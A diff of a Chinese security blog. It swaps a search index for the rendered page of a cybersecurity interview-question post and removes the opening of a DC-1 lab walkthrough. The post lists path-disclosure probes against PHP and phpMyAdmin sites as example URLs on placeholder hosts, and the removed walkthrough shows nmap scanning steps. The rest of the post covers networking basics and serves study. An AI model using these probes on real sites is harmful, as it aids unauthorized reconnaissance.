@@ -1,29 +1,126 @@
-<?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>安全面试题</title>
-    <url>/2024/04/02/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BA%93/</url>
-    <content><![CDATA[<h1 id="网络安全面试题"><a href="#网络安全面试题" class="headerlink" title="网络安全面试题"></a>网络安全面试题</h1><h2 id="1-php爆绝对路径的方法？"><a href="#1-php爆绝对路径的方法？" class="headerlink" title="1.php爆绝对路径的方法？"></a>1.php爆绝对路径的方法？</h2><h3 id="1-1单引号引起数据库报错"><a href="#1-1单引号引起数据库报错" class="headerlink" title="1.1单引号引起数据库报错"></a>1.1单引号引起数据库报错</h3><ul>
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>安全面试题 - 菜站</title>
+
+  
+    <meta name="description" content="网络安全面试题1.php爆绝对路径的方法？1.1单引号引起数据库报错 说明：直接在URL后面加单引号，要求单引号没有被过滤(gpc&#x3D;off)且服务器默认返回错误信息。 举例：https:&#x2F;&#x2F;www.xxx.com&#x2F;news.php?id&#x3D;149‘  1.2访问错误参数或错误路径 说明：将要提交的参数值改成错误值，比如**-1** 举例：https:&#x2F;&#x2F;www.xxx.com&#x2F;resear">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全面试题">
+<meta property="og:url" content="https://coolajui.github.io/2024/04/02/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BA%93/index.html">
+<meta property="og:site_name" content="菜站">
+<meta property="og:description" content="网络安全面试题1.php爆绝对路径的方法？1.1单引号引起数据库报错 说明：直接在URL后面加单引号，要求单引号没有被过滤(gpc&#x3D;off)且服务器默认返回错误信息。 举例：https:&#x2F;&#x2F;www.xxx.com&#x2F;news.php?id&#x3D;149‘  1.2访问错误参数或错误路径 说明：将要提交的参数值改成错误值，比如**-1** 举例：https:&#x2F;&#x2F;www.xxx.com&#x2F;resear">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402101059425.png">
+<meta property="og:image" content="c:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402103621998.png">
+<meta property="og:image" content="c:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402103653198.png">
+<meta property="og:image" content="c:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402105242397.png">
+<meta property="og:image" content="c:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402105325904.png">
+<meta property="article:published_time" content="2024-04-02T03:37:54.000Z">
+<meta property="article:modified_time" content="2024-04-02T06:54:11.438Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络安全，护网">
+<meta property="article:tag" content="面试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402101059425.png">
+  
+  
+  
+  <meta name="keywords" content="网络安全，护网,面试">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="菜站" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+
+  
+
+  
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic1.zhimg.com/v2-dcda957b71759ebad5d2afaf3579bfb2_r.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">菜站</div><div class="sub cap">上班的动力是什么？ / 没钱~</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+
+
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/02/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BA%93/"><span class="title">安全面试题</span></a><a class="item title" href="/2024/04/01/DC-9/"><span class="title">DC-9</span></a><a class="item title" href="/2024/04/01/la/"><span class="title">DC-1</span></a><a class="item title" href="/2024/03/31/ni-hao/"><span class="title">好杂</span></a><a class="item title" href="/2024/03/30/My-Blog/"><span class="title">使用Hexo搭建个人博客</span></a><a class="item title" href="/2024/03/30/hello-world/"><span class="title">Hello World</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%EF%BC%8C%E9%A2%98%E5%BA%93%EF%BC%8C%E9%9D%A2%E8%AF%95/">网络安全知识，题库，面试</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-04-02T03:37:54.000Z">2024-04-02</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-04-02T06:54:11.438Z">2024-04-02</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>安全面试题</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="网络安全面试题"><a href="#网络安全面试题" class="headerlink" title="网络安全面试题"></a>网络安全面试题</h1><h2 id="1-php爆绝对路径的方法？"><a href="#1-php爆绝对路径的方法？" class="headerlink" title="1.php爆绝对路径的方法？"></a>1.php爆绝对路径的方法？</h2><h3 id="1-1单引号引起数据库报错"><a href="#1-1单引号引起数据库报错" class="headerlink" title="1.1单引号引起数据库报错"></a>1.1单引号引起数据库报错</h3><ul>
 <li>说明：直接在URL后面加单引号，要求单引号没有被过滤(gpc&#x3D;off)且服务器默认返回错误信息。</li>
-<li>举例：<a href="https://www.xxx.com/news.php?id=149">https://www.xxx.com/news.php?id=149</a>‘</li>
+<li>举例：<a target="_blank" rel="noopener" href="https://www.xxx.com/news.php?id=149">https://www.xxx.com/news.php?id=149</a>‘</li>
 </ul>
 <h3 id="1-2访问错误参数或错误路径"><a href="#1-2访问错误参数或错误路径" class="headerlink" title="1.2访问错误参数或错误路径"></a>1.2访问错误参数或错误路径</h3><ul>
 <li>说明：将要提交的参数值改成错误值，比如**-1**</li>
-<li>举例：<a href="https://www.xxx.com/researcharchive.php?id=-1">https://www.xxx.com/researcharchive.php?id=-1</a></li>
+<li>举例：<a target="_blank" rel="noopener" href="https://www.xxx.com/researcharchive.php?id=-1">https://www.xxx.com/researcharchive.php?id=-1</a></li>
 </ul>
 <h3 id="1-3扫描开发未删除的测时文件-探针类文件如phpinfo"><a href="#1-3扫描开发未删除的测时文件-探针类文件如phpinfo" class="headerlink" title="1.3扫描开发未删除的测时文件&#x2F;探针类文件如phpinfo"></a>1.3扫描开发未删除的测时文件&#x2F;探针类文件如phpinfo</h3><ul>
 <li>说明：部分开发人员和测试人员会将测试文件留着，这样可以借助扫描工具将其扫描出来也可以爆绝对路径。很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()</li>
 <li>举例：</li>
-<li><a href="https://www.xxx.com/test.php">https://www.xxx.com/test.php</a><ul>
-<li><a href="https://www.xxx.com/ceshi.php">https://www.xxx.com/ceshi.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.com/test.php">https://www.xxx.com/test.php</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.com/ceshi.php">https://www.xxx.com/ceshi.php</a></li>
 </ul>
 </li>
-<li><a href="https://www.xxx.com/info.php">https://www.xxx.com/info.php</a><ul>
-<li><a href="https://www.xxx.com/phpinfo.php">https://www.xxx.com/phpinfo.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.com/info.php">https://www.xxx.com/info.php</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.com/phpinfo.php">https://www.xxx.com/phpinfo.php</a></li>
 </ul>
 </li>
-<li><a href="https://www.xxx.com/php_info.php">https://www.xxx.com/php_info.php</a><ul>
-<li><a href="https://www.xxx.com/1.php">https://www.xxx.com/1.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.com/php_info.php">https://www.xxx.com/php_info.php</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.com/1.php">https://www.xxx.com/1.php</a></li>
 </ul>
 </li>
 </ul>
@@ -35,10 +132,10 @@
 <h3 id="1-5phppmyadmin爆路径-phpmyadmin-libraries-lect-lang-lib-php"><a href="#1-5phppmyadmin爆路径-phpmyadmin-libraries-lect-lang-lib-php" class="headerlink" title="1.5phppmyadmin爆路径:&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php"></a>1.5phppmyadmin爆路径:&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php</h3><ul>
 <li>说明：一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。</li>
 <li>举例：<ul>
-<li><a href="https://www.xxxx.cc/phpmyadmin/themes/darkblue_orange/layout.inc.php">https://www.xxxx.cc/phpmyadmin/themes/darkblue_orange/layout.inc.php</a></li>
-<li><a href="https://www.xxx.cc/phpmyadmin/libraries/select_lang.lib.php">https://www.xxx.cc/phpmyadmin/libraries/select_lang.lib.php</a></li>
-<li><a href="https://www.xxx.cc/phpmyadmin/libraries/mcrypt.lib.php">https://www.xxx.cc/phpmyadmin/libraries/mcrypt.lib.php</a></li>
-<li><a href="https://www.xxxx.cc/phpmyadmin/index.php?lang%5B%5D=1">https://www.xxxx.cc/phpmyadmin/index.php?lang[]=1</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xxxx.cc/phpmyadmin/themes/darkblue_orange/layout.inc.php">https://www.xxxx.cc/phpmyadmin/themes/darkblue_orange/layout.inc.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.cc/phpmyadmin/libraries/select_lang.lib.php">https://www.xxx.cc/phpmyadmin/libraries/select_lang.lib.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xxx.cc/phpmyadmin/libraries/mcrypt.lib.php">https://www.xxx.cc/phpmyadmin/libraries/mcrypt.lib.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xxxx.cc/phpmyadmin/index.php?lang%5B%5D=1">https://www.xxxx.cc/phpmyadmin/index.php?lang[]=1</a></li>
 </ul>
 </li>
 </ul>
@@ -662,7 +759,7 @@
 </ul>
 </li>
 </ul>
-<h2 id="76-重要协议分布图"><a href="#76-重要协议分布图" class="headerlink" title="76.重要协议分布图"></a>76.重要协议分布图</h2><p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402101059425.png" alt="image-20240402101059425"></p>
+<h2 id="76-重要协议分布图"><a href="#76-重要协议分布图" class="headerlink" title="76.重要协议分布图"></a>76.重要协议分布图</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402101059425.png" alt="image-20240402101059425"></p>
 <h2 id="77-arp协议的工作原理"><a href="#77-arp协议的工作原理" class="headerlink" title="77.arp协议的工作原理"></a>77.arp协议的工作原理</h2><ul>
 <li>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。<ul>
 <li>发送ARP请求的以太网数据帧 广播 到以太网上的每个主机，ARP请求帧中包含了目的主机的IP地址。 </li>
@@ -692,7 +789,7 @@
 </ul>
 <h2 id="79-dns是什么？dns的工作原理"><a href="#79-dns是什么？dns的工作原理" class="headerlink" title="79.dns是什么？dns的工作原理"></a>79.dns是什么？dns的工作原理</h2><p>将主机域名转换为ip地址，属于应用层协议，使用UDP传输。（DNS应用层协议，以前有个考官问过） </p>
 <ul>
-<li><p>过程： <img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402103621998.png" alt="image-20240402103621998"></p>
+<li><p>过程： <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402103621998.png" alt="image-20240402103621998"></p>
 </li>
 <li><p>总结： 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓 存，主域名服务器缓存。 </p>
 <ul>
@@ -710,7 +807,7 @@
 </ul>
 </li>
 </ul>
-<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402103653198.png" alt="image-20240402103653198"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402103653198.png" alt="image-20240402103653198"></p>
 <h2 id="80-rip协议是什么？rip的工作原理"><a href="#80-rip协议是什么？rip的工作原理" class="headerlink" title="80.rip协议是什么？rip的工作原理"></a>80.rip协议是什么？rip的工作原理</h2><p>RIP动态路由选择协议（网络层协议） </p>
 <p>RIP是一种基于距离矢量（Distance-Vector）算法的协议，它使用跳数（Hop Count）作为度量来衡量 到达目的网络的路由距离。RIP通过UDP报文进行路由信息的交换，使用的端口号520。</p>
 <p><strong>工作原理：</strong> RIP路由协议用“更新（UNPDATES）”和“请求（REQUESTS）”这两种分组来传输信息的。每个具有RIP协 议功能的路由器每隔30秒用UDP520端口给与之直接相连的机器广播更新信息。并且在（ 用“路程段数” （即“跳数”）作为网络距离的尺度。每个路由器在）给相邻路由器发出路由信息时，都会给每个路径加 上内部距离。</p>
@@ -756,7 +853,7 @@
 </li>
 </ul>
 <p>完成三次握手，客户端与服务器开始传送数据 </p>
-<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402105242397.png" alt="image-20240402105242397"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402105242397.png" alt="image-20240402105242397"></p>
 <ul>
 <li><p>客户端先发送FIN，进入FIN_WAIT1状态，用来关闭Client到Server的数据传送 </p>
 </li>
@@ -771,7 +868,7 @@
 <p>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一 个FIN占用一个序号）。 </p>
 <p>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动 关闭方，我的数据也发送完了，不会再给你发数据了。</p>
 <p> 第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成 四次挥手</p>
-<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402105325904.png" alt="image-20240402105325904"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240402105325904.png" alt="image-20240402105325904"></p>
 <h2 id="85-GET-和-POST-的区别"><a href="#85-GET-和-POST-的区别" class="headerlink" title="85.GET 和 POST 的区别"></a>85.GET 和 POST 的区别</h2><p>get是获取数据，post是修改数据 </p>
 <p>get把请求的数据放在url上， 以?分割URL和传输数据，参数之间以&amp;相连，所以get不太安全。而post把 数据放在HTTP的包体内（requrest body） </p>
 <ul>
@@ -808,7 +905,7 @@
 </li>
 <li><p>https协议需要到ca申请证书，一般免费证书较少，因而需要一定费用。 </p>
 </li>
-<li><p>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 <a href="https://www.cnblogs.com/wqhwe/p/5407468.html">https://www.cnblogs.com/wqhwe/p/5407468.html</a></p>
+<li><p>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wqhwe/p/5407468.html">https://www.cnblogs.com/wqhwe/p/5407468.html</a></p>
 </li>
 </ol>
 <h2 id="90-OSI-的七层模型都有哪些？"><a href="#90-OSI-的七层模型都有哪些？" class="headerlink" title="90.OSI 的七层模型都有哪些？"></a>90.OSI 的七层模型都有哪些？</h2><ul>
@@ -931,432 +1028,401 @@
 </li>
 </ol>
 <p>TTL(生存时间值)：该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量。</p>
-]]></content>
-      <categories>
-        <category>网络安全知识，题库，面试</category>
-      </categories>
-      <tags>
-        <tag>网络安全，护网</tag>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC-1</title>
-    <url>/2024/04/01/la/</url>
-    <content><![CDATA[<ol>
-<li><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1></li>
-<li><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2></li>
-<li><p>Kali</p>
-</li>
-<li><p>DC-1靶场机安装</p>
-</li>
-</ol>
-<p>安装链接：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
-<ol>
-<li><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2></li>
-</ol>
-<p>下载文件进行解压</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2FiOTE0ZDZiOWQwZjBhMGFlYTljMmYzNTA0NzAyZTJfQU1Ya3dVeE9XSGZ3cHZDdTUxTUVjTjNJeTB4Q3R3MWxfVG9rZW46UzEyTGJyZVg5b3E4UWx4WXhoVGNJYnlCbk5kXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>解压完成直接使用虚拟机打开</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzNmYmZmOGEwZGY5ZjY3NTdiNDU5Mzc2YmQ0OGY0ZDBfS1U5QnozaWtzcElWaUxtdWpsWEV4NHprRWpWSnczT0VfVG9rZW46RWt5c2J4QUxNb3NsOG14NFAzRWM2ankzbmVmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>提示导入失败，不过没有关系点重试就好，导入完成后，打开DC-1虚拟机并等待，过程中别点进虚拟机里面</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY1ZjcwYjUyNjUwZDM3MjRkZjM1YjlkZGNlYTc4MjBfbWVGY0NFeWVXSVY0dDBrSlZ3cHpHTTdpeVBHN21QRFFfVG9rZW46VTVZM2I1bk5Jb3ZMd2l4UEsybGNsTjljbmhoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>出现这个界面就表示开启成功 （渗透完得到密码就能登入啦）</p>
-<h4 id="注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https-zhuanlan-zhihu-com-p-65103100）"><a href="#注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https-zhuanlan-zhihu-com-p-65103100）" class="headerlink" title="注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https://zhuanlan.zhihu.com/p/65103100）"></a>注意！！！！<a href="https://so.csdn.net/so/search?q=%E9%9D%B6%E6%9C%BA&spm=1001.2101.3001.7020">靶机</a>和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（<a href="https://zhuanlan.zhihu.com/p/65103100%EF%BC%89">https://zhuanlan.zhihu.com/p/65103100）</a></h4><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmVlMjM1YWI5NjJkOGE3NDYwNjA0MmYyMDRiYzI4YWNfc2dwNGRrU2Y0Ylh3N2VPR25Va3BOd21NN2ZSZ1EwMkZfVG9rZW46RTBaUGJ6TlE5b2M0alp4bjhnNGNXYnFvblNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
-<li><h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1></li>
-</ol>
-<p>这个过程需要用到kali，打开kali</p>
-<ol>
-<li><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2></li>
-</ol>
-<h3 id="①探测主机ip"><a href="#①探测主机ip" class="headerlink" title="①探测主机ip"></a>①探测主机ip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODQzNDYyNGM3ODczZjkyZGMzY2JhMzAzMTY3NDE4YjJfcTZKUG5aWnZ6ZU9PUHo0cjFyMWY4S2hYcGExdkpFY3hfVG9rZW46SmNXc2J4NHZIb2pJZlp4ZW9yWmNuakNJbmplXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<h3 id="②探测目标ip开放端口"><a href="#②探测目标ip开放端口" class="headerlink" title="②探测目标ip开放端口"></a>②探测目标ip开放端口</h3><p>用nmap来探测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP</span><br></pre></td></tr></table></figure>
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>希望你今天开心，明天开心，后天也开心</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/04/01/la/">DC-1</a></div></section></div>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY1MDJlOTVmYmM4YmIwMjNlY2QwOWFjMWMwYzliZWRfSnNyQVhmYk84M3BBdk5jdXZ4M05xY2g5Rk56UHVDVUlfVG9rZW46TFVFQWJJTkNZb0prelV4UElsSmNOUVgxbkxmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>进行端口的扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap -P</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5NmM0M2E0YzY0YmNlNzMyYThlNjRjODIzYjdmNGJfTERsTkUyTlJaTWt3bW9hU2FyTXZ4UG9HQ3NyZ21LTjNfVG9rZW46R3BYM2I1bHdib0FDY3p4SncxTGNZSFg3bkJoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<h5 id="③收集网页信息"><a href="#③收集网页信息" class="headerlink" title="③收集网页信息"></a>③收集网页信息</h5><p>浏览器输入地址</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA0YjAwODMyYTVlMDQwYzcwZjY2N2YwYjE2ODNjMDJfamN2Smpya3hiTDlKZXFlNExBbUVqM1AxVGdERkY0ZXJfVG9rZW46U3d4cmJBREZ1b3ZZQ0t4TmliS2NlajF3bnBlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>利用火绒插件<strong>wappalyzer</strong>，查看站点信息，也可以自己判断，网页一看cms就是drupal</p>
-<h5 id="什么是cms？"><a href="#什么是cms？" class="headerlink" title="什么是cms？"></a>什么是cms？</h5><blockquote>
-<p>CMS是”Content Management System”的缩写，意为”内容管理系统”。 它采用统一的信息组织的方法即分类，对同一类型的信息进行分类，且每一类信息都可以进行新建（Add）、查看（View）、编辑（Edit）和删除（Delete）四种不同的操作。除了使用分类的方式组织信息以外，又采用了统一的用户和权限管理对信息的使用进行控制，即构成了一个完整的信息组织和管理的体系。内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场.</p>
-</blockquote>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzg4ZjhmNjMzYmVkNTM2YjUzYTFjNjZiZDM0YmY0NWVfZ1hYSVFFUEh6cmdZUE5JTjlZOGVTSk1meGxYRkhQRnpfVG9rZW46SUVtZGJrVzZxb0IyYXp4cEVjZWNQSlRZbklrXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
